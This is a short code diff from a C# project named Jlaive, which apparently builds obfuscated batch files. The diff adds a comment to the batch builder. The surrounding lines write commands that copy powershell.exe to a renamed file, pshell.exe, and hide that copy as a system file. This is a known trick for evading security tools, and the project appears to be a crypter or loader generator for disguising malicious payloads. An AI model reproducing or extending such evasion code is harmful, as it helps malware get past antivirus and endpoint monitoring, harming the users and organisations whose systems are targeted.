@@ -90,6 +90,7 @@ namespace Jlaive
 
             Console.WriteLine("Constructing batch file...");
             StringBuilder toobf = new StringBuilder();
+            toobf.AppendLine("rem https://github.com/ch2sh/Jlaive");
             toobf.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe pshell.exe /y");
             toobf.AppendLine("attrib +s +h pshell.exe");
             toobf.AppendLine("cls");
